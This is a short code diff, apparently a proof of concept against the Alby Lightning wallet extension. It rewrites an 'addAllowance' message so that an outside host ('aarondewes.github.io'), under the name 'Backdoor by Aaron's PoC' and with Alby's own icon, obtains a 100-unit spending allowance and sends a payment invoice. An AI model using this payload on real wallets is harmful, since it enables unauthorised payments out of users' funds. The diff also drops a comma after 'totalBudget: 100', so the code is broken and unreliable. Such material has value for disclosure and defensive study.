@@ -58,8 +58,10 @@
             action: "addAllowance",
             type: "sendPaymentOrPrompt",
             args: {
-              totalBudget: 100,
-              enabled: true,
+              totalBudget: 100
+              host: "aarondewes.github.io",
+              name: "Backdoor by Aaron's PoC",
+              imageURL: "https://github.com/getAlby/website/blob/main/public/images/alby_icon_head_icon.png?raw=true",
               paymentRequest: await getInvoice(1000),
             },
           },
